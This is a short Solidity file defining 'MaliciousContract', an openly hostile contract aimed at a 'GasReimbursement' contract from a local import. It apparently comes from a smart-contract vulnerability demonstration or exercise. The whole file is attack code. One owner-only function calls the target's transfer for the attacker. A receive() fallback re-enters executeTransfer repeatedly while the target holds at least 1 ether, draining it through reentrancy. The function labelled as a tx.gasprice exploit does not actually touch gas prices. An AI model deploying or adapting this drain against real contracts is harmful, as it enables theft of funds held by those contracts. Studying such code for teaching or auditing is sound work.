// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "./gas-price.sol";

contract MaliciousContract {
    GasReimbursement public target;
    address public attacker;

    constructor(address _target) {
        target = GasReimbursement(_target);
        attacker = msg.sender;
    }

    // Function to exploit the tx.gasprice vulnerability
    function exploitTxGasPrice() external {
        require(msg.sender == attacker, "Not authorized");
        target.executeTransfer(attacker);
    }

    // Reentrancy attack using a fallback function
    receive() external payable {
        if (address(target).balance >= 1 ether) {
            target.executeTransfer(attacker);
        }
    }
}